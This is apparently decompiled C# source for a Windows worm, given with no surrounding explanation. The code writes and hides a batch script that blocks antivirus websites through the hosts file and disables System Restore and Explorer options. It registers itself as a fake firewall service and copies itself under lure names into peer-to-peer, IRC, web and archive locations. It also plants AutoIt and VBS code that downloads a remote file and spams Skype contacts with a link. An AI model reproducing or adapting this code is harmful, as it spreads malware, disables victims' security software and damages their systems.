using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns1;
using ns2;

namespace ns3;

internal sealed class Class14
{
	private static object smethod_0()
	{
		object obj = default(object);
		try
		{
			string text = Conversions.ToString(((ServerComputer)Class2.smethod_0()).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));
			text.Replace("\\", "/");
			obj = obj;
			return obj;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return obj;
		}
	}

	private static void smethod_1()
	{
		try
		{
			string text = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Conversions.ToString(Operators.ConcatenateObject(smethod_0(), (object)text)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text2));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		FileStream stream = new FileStream("C:\\windows\\system32\\launchh.vbs", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.WriteLine("Dim oShell");
		streamWriter.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
		streamWriter.WriteLine("oShell.run \"C:\\windows\\system32\\launchh.bat\",0,True");
		streamWriter.WriteLine("Set oShell = Nothing ");
		streamWriter.Close();
		FileStream stream2 = new FileStream("C:\\windows\\system32\\launchh.bat", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter2 = new StreamWriter(stream2);
		streamWriter2.WriteLine("@echo off & break off");
		streamWriter2.WriteLine(":%random%");
		streamWriter2.WriteLine("echo 127.0.0.1 antivir.de >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.antivir.de >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 fsecure.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.fsecure.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.symantec.com >%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 securityresponse.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.sophos.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 sophos.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 liveupdate.symantecliveupdate.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.viruslist.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 viruslist.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 f-secure.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.f-secure.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 kaspersky.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.avp.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.kaspersky.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 avp.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.networkassociates.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 networkassociates.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.ca.com ca.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 mast.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 my-etrust.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.my-etrust.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 download.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 dispatch.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 secure.nai.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 nai.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.nai.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 update.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 updates.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 us.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 liveupdate.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 customer.symantec.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 rads.mcafee.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 trendmicro.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.microsoft.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.trendmicro.com >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 metalhead2005.info >>%windir%\\system32\\drivers\\etc\\hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.symantec.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.sophos.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.avast.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.mcafee.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.f-prot.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.f-secure.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.avp.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.kaspersky.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.bitdefender.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.my-etrust.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.eset.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.norman.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("echo 127.0.0.1 www.grisoft.com>>c:\\windows\\system32\\Drivers\\Etc\\Hosts");
		streamWriter2.WriteLine("attrib +h +s +r " + Path.GetTempPath() + "svchost.exe");
		streamWriter2.WriteLine("if exist \"%programfiles%\\AutoIt3\\Include\\*.au3\" (");
		streamWriter2.WriteLine("echo InetGet(\"" + Class7.string_0 + "\", \"%windir%\\system32\\sys.bat\", 1, 0) >>%programfiles%\\Autoit3\\Include\\*.au3");
		streamWriter2.WriteLine("echo run(\"%winidr%\\system32\\sys.bat\") >>%programfiles%\\Autoit3\\Include\\*.au3");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"HideFileExt\" /t \"REG_DWORD\" /d 1 /f");
		streamWriter2.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"Hidden\" /t \"REG_DWORD\" /d 2 /f");
		streamWriter2.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoFind\" /t \"REG_DWORD\" /d 1 /f");
		streamWriter2.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoFolderOptions\" /t \"REG_DWORD\" /d 1 /f");
		streamWriter2.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"SuperHidden\" /t \"REG_DWORD\" /d 0 /f");
		streamWriter2.WriteLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"ShowSuperHidden\" /t \"REG_DWORD\" /d 0 /f");
		streamWriter2.WriteLine("echo nzm_bot.exe >%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo msn_plus.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Icq_hack.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo worm_generator.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Command&conquer_Generals.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Worldofwarcraft_crack.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo ea_games-cdkey.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo skype_unlimited.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo 1000_worm_sources.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Windows7_withSerial.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Windows_Vista+Windows_7.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("type C:\\WINDOWS\\system32\\logstm123.txt >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo WindowsVistaultimate.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Vista_ultimate.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo WinXp.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo WinXPpro.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo every_youpornvid.pif >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Warcraft3+expansion.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo bitdefender+crack.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Flyff_PS.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Porn_Jessica_Alba.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Jessica_alba_screensaver.scr >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo win_mediaplayer_11.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Cheatgenerator.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo PhotoshopCS3.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo %username%_sucks.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo yourmother.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo irc_bot_source.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo vb.net_ultra_worm.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo VB6_install.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Limewire_pro.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo ICQ_hacker.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo become_hacker.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Hacking.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo How_to_hack.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Youtube_video_converter.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Emule_speedup.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Windows_faster_tutorial.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Rapidshare_account.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo WOW_account.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo game_collection.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Windows_NT.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo %username%.pif >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo callofduty.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo how_to_be_an_hacker.pif >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo callofduty6.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo callofduty5.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo callofduty4.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo callofduty3.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo cod6.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo starcraft.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo starcraft_ghost.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo yugioh.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Conficker_source.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo Conficker_removal.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo exploit_pack.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("echo allexploits.exe >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine("for %%t in (%userprofile%\\desktop\\*.exe) do (");
		streamWriter2.WriteLine("echo %%t >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%t in (C:\\*.exe) do (");
		streamWriter2.WriteLine("echo %%t >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("dir /ad /b %programfiles% >%windir%\\run.tmp");
		streamWriter2.WriteLine("for /f %%g in (%windir%\\run.tmp) do (");
		streamWriter2.WriteLine("echo %%g >>%windir%\\system32\\13l.dll");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("set /a ran0=%random%%%9");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\BearShare\\Shared\\%ran0%ea-keygen.exe ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\eDonkey2000\\incoming\\britney_spears_naked.scr ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\eMule\\Incoming\\battlefield2-3.exe ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\gnucleus\\downloads\\incoming\\wormgenerator.exe ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\grokster\\my grokster\\virusgen.exe ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\icq\\shared files\\C&C_%ran0%.exe ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\KaZaa Lite\\My Shared Folder\\best_porn.scr ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\KaZaa\\My Shared Folder\\virtual_girls_all.scr ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\Morpheus\\my shared folder\\icq_unlimited.%ran0%.exe ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\StreamCast\\Morpheus\\my shared folder\\windows_vista.exe ");
		streamWriter2.WriteLine("if exist %windir%\\system32\\sys.rar (");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\BearShare\\Shared\\%ran0%ea-keygen.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\eDonkey2000\\incoming\\britney_spears_naked.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\eMule\\Incoming\\battlefield2-3.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\eMule\\Incoming\\battlefield%ran0%.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\gnucleus\\downloads\\incoming\\wormgenerator.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\grokster\\my grokster\\virusgen.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\icq\\shared files\\C&C_%ran0%.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\KaZaa Lite\\My Shared Folder\\best_porn.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\KaZaa\\My Shared Folder\\virtual_girls_all.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\KaZaa\\My Shared Folder\\%ran0%_virtual_girls.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\Morpheus\\my shared folder\\icq_unlimited.%ran0%.rar ");
		streamWriter2.WriteLine("copy %windir%\\system32\\sys.rar %programfiles%\\StreamCast\\Morpheus\\my shared folder\\windows_vista.rar ");
		streamWriter2.WriteLine("del /f %windir%\\system32\\sys.rar");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for /f %%b in (%windir%\\system32\\13l.dll) do (");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\BearShare\\Shared\\%ran0%%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\eDonkey2000\\incoming\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\eMule\\Incoming\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\gnucleus\\downloads\\incoming\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\grokster\\my grokster\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\icq\\shared files\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\KaZaa Lite\\My Shared Folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\KaZaa\\My Shared Folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\Morpheus\\my shared folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\StreamCast\\Morpheus\\my shared folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " C:\\My Downloads\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\direct connect\\received files\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\gnucleus\\downloads\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %programfiles%\\grokster\\my shared folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %programfiles%\\KMD\\my shared folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %programfiles%\\limeWire\\shared\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %programfiles%\\StreamCast\\Morpheus\\my shared folder\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %programfiles%\\XPCode\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  C:\\Inetpub\\ftproot\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  C:\\appserv\\www\\%ran0%%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  C:\\%programfiles%\\appserv\\www\\%%b ");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  " + folderPath + "Microsoft\\Messenger\\porn_%random%.scr");
		streamWriter2.WriteLine("dir /s /ad /b" + folderPath + "* >>%windir%\\system32\\tomp.txt");
		streamWriter2.WriteLine("for /f %%o in (%windir%\\system32\\tomp.txt) do (");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%o\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%o\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%o\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%o\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%o\\%%b ");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%o\\%username%_naked.exe ");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("cd %systemdrive%\\");
		streamWriter2.WriteLine("dir /s /ad /b *shar* >>%windir%\\krnsys.dll");
		streamWriter2.WriteLine("for /f %%n in (%windir%\\system32\\krnsys.dll) do (");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + "  %%n\\%%b ");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("dir /s /ad /b *www* >%windir%\\temp.dtx");
		streamWriter2.WriteLine("for /f %%y in (%windir%\\temp.dtx) do (");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " %%y\\windows_7_full.exe");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("dir /s /ad /b * >%windir%\\tmp.log");
		streamWriter2.WriteLine("if exist \"%programfiles%\\WINRAR\\WinRAR.exe\" (");
		streamWriter2.WriteLine("set r = \"%programfiles%\\WINRAR\\WinRAR.exe\"");
		streamWriter2.WriteLine("copy " + Application.get_ExecutablePath() + " C:\\start.exe ");
		streamWriter2.WriteLine("for /f %%l in (%windir%\\tmp.log) do (");
		streamWriter2.WriteLine("for %%o in (%%l\\*.rar) do (");
		streamWriter2.WriteLine("%r% a -ibck -y %%o C:\\start.exe");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("%r% a -ibck -y %windir%\\system32\\sys.rar C:\\start.exe");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("if exist C:\\start.exe del C:\\start.exe");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t REG_DWORD /d \"1\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t REG_DWORD /d \"1\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"ImagePath\" /t \"REG_EXPAND_SZ\" /d \"" + Application.get_ExecutablePath() + "\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"DisplayName\" /d \"Default Windows Firewall\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"ObjectName\"  /d \"LocalSystem\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"Start\" /t REG_DWORD /d \"2\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"ErrorControl\" /t REG_DWORD /d \"0\" /f");
		streamWriter2.WriteLine("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Firewall\" /v \"Type\" /t REG_DWORD /d \"110\" /f");
		streamWriter2.WriteLine("if exist C:\\mirc (");
		streamWriter2.WriteLine("echo ;Do not edit this or Mirc may not run correctly >>C:\\mirc\\script.ini");
		streamWriter2.WriteLine("echo [script] >>C:\\mirc\\script.ini");
		streamWriter2.WriteLine("echo n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick " + Application.get_ExecutablePath() + " } >>C:\\mirc\\script.ini ");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("if exist \"%programfiles%\\mirc\" (");
		streamWriter2.WriteLine("echo ;Do not edit this or Mirc may not run correctly >>\"%programfiles%\\mirc\"");
		streamWriter2.WriteLine("echo [script] >>\"%programfiles%\\mirc\"");
		streamWriter2.WriteLine("echo n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick " + Application.get_ExecutablePath() + " } >>\"%programfiles%\\mirc\" ");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("if exist \"%systemdrive%\\mirc\" (");
		streamWriter2.WriteLine("echo ;Do not edit this or Mirc may not run correctly >>\"%programfiles%\\mirc\"");
		streamWriter2.WriteLine("echo [script] >>\"%programfiles%\\mirc\"");
		streamWriter2.WriteLine("echo n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick " + Application.get_ExecutablePath() + " } >>\"%programfiles%\\mirc\" ");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("type %0 >>%windir%\\system32\\config.*");
		streamWriter2.WriteLine("dir /s /ad /b %systemdrive%\\* >>%windir%\\justemp.lgg");
		streamWriter2.WriteLine("for /F %%k in (%windir%\\justemp.lgg) do (");
		streamWriter2.WriteLine("if exist %%k\\*.vbs do (");
		streamWriter2.WriteLine("echo on error resume next >>%%k\\*.vbs");
		streamWriter2.WriteLine("echo set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\") >>%%k\\*.vbs");
		streamWriter2.WriteLine("echo Fruxr.Client.Start() >>%%k\\*.vbs");
		streamWriter2.WriteLine("echo Fruxr.Attach() >>%%k\\*.vbs");
		streamWriter2.WriteLine("echo For Each KZN In Fruxr.Friends >>%%k\\*.vbs");
		streamWriter2.WriteLine("echo Fruxr.SendMessage KZN.handle,\"lol me hot " + Class7.string_0 + "\" >>%%k\\*.vbs");
		streamWriter2.WriteLine("echo next >>%%k\\*.vbs");
		streamWriter2.Close();
		Class7.Sleep(100000L);
		Process.Start("C:\\windows\\system32\\launchh.vbs");
		Class7.Sleep(100000L);
		FileInfo fileInfo = new FileInfo("C:\\windows\\system32\\launchh.vbs");
		fileInfo.Delete();
		FileInfo fileInfo2 = new FileInfo("C:\\windows\\system32\\launchh.bat");
		fileInfo2.Delete();
		smethod_1();
	}
}
